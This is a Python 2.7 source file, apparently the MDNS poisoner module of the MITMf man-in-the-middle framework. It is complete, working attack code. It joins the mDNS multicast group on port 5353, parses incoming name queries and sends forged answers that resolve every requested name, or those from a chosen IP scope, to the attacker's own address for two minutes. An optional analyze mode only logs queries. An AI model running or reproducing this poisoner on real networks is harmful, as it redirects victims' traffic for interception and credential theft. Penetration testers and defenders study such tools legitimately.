#! /usr/bin/env python2.7

import threading
import socket
import struct
import logging

from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
from core.configwatcher import ConfigWatcher
from core.responder.odict import OrderedDict
from core.responder.packet import Packet
from core.responder.common import *

mitmf_logger = logging.getLogger("mitmf")

class MDNSPoisoner():

	def start(self, options, ourip):
		
		global args; args = options
		global OURIP; OURIP = ourip

		try:
			mitmf_logger.debug("[MDNSPoisoner] OURIP => {}".format(OURIP))
			server = ThreadingUDPMDNSServer(("0.0.0.0", 5353), MDNS)
			t = threading.Thread(name="MDNSPoisoner", target=server.serve_forever)
			t.setDaemon(True)
			t.start()
		except Exception, e:
			print "[MDNSPoisoner] Error starting on port 5353: {}" .format(e)

class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):

	allow_reuse_address = 1

	def server_bind(self):
		MADDR = "224.0.0.251"
		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR)+ socket.inet_aton(OURIP))
		UDPServer.server_bind(self)

class MDNSAns(Packet):
	fields = OrderedDict([
		("Tid",              "\x00\x00"),
		("Flags",            "\x84\x00"),
		("Question",         "\x00\x00"),
		("AnswerRRS",        "\x00\x01"),
		("AuthorityRRS",     "\x00\x00"),
		("AdditionalRRS",    "\x00\x00"),
		("AnswerName",       ""),
		("AnswerNameNull",   "\x00"),
		("Type",             "\x00\x01"),
		("Class",            "\x00\x01"),
		("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn.
		("IPLen",            "\x00\x04"),
		("IP",               "\x00\x00\x00\x00"),
	])

	def calculate(self):
		self.fields["IP"] = inet_aton(OURIP)
		self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))

def Parse_MDNS_Name(data):
	data = data[12:]
	NameLen = struct.unpack('>B',data[0])[0]
	Name = data[1:1+NameLen]
	NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
	Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
	return Name+'.'+Name_

def Poisoned_MDNS_Name(data):
	data = data[12:]
	Name = data[:len(data)-5]
	return Name

class MDNS(BaseRequestHandler):

	def handle(self):

		ResponderConfig = ConfigWatcher.getInstance().getConfig()['Responder']
		RespondTo       = ResponderConfig['RespondTo']

		MADDR = "224.0.0.251"
		MPORT = 5353
		data, soc = self.request
		if self.client_address[0] == "127.0.0.1":
			pass
		try:
			if args.analyze:
				if Parse_IPV6_Addr(data):
					mitmf_logger.info('[MDNSPoisoner] {} is looking for: {}'.format(self.client_address[0],Parse_MDNS_Name(data)))

			if RespondToSpecificHost(RespondTo):
				if args.analyze == False:
					if RespondToIPScope(RespondTo, self.client_address[0]):
						if Parse_IPV6_Addr(data):

							mitmf_logger.info('[MDNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0],Parse_MDNS_Name(data)))
							Name = Poisoned_MDNS_Name(data)
							MDns = MDNSAns(AnswerName = Name)
							MDns.calculate()
							soc.sendto(str(MDns),(MADDR,MPORT))

			if args.analyze == False and RespondToSpecificHost(RespondTo) == False:
				if Parse_IPV6_Addr(data):
					mitmf_logger.info('[MDNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0],Parse_MDNS_Name(data)))
					Name = Poisoned_MDNS_Name(data)
					MDns = MDNSAns(AnswerName = Name)
					MDns.calculate()
					soc.sendto(str(MDns),(MADDR,MPORT))
			else:
				pass
		except Exception:
			raise